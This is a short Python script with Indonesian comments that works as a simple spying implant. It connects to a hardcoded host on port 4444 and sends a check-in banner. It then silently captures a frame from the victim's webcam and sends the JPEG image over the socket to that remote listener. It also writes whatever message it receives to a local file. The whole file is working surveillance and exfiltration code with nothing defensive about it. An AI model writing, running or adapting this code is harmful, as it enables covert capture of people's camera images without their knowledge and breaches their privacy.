import socket
import cv2
import numpy as np

# Fungsi untuk mengambil gambar dari webcam dan mengirim datanya melalui socket
def capture_and_send(sock):
    cap = cv2.VideoCapture(0)  # Mengakses kamera utama

    ret, frame = cap.read()  # Membaca satu frame

    # Mengubah gambar menjadi bentuk byte
    data = cv2.imencode('.jpg', frame)[1].tobytes()

    # Mengirim data gambar melalui socket
    sock.sendall(data)

    cap.release()
    cv2.destroyAllWindows()

# Buat koneksi socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.3', 4444))

pesan = "[+] masuk wak : "
sock.sendto(pesan.encode(), ('192.168.1.16', 4444))

# Menerima pesan dari komputer yang terhubung
data_masuk = sock.recv(1024)
print(data_masuk)

# Menulis pesan ke dalam file teks
with open("received_message.txt", 'w') as file:
    file.write(data_masuk.decode())

# Panggil fungsi untuk mengambil gambar dari webcam dan mengirimnya
capture_and_send(sock)

# Tutup koneksi socket setelah selesai
sock.close()
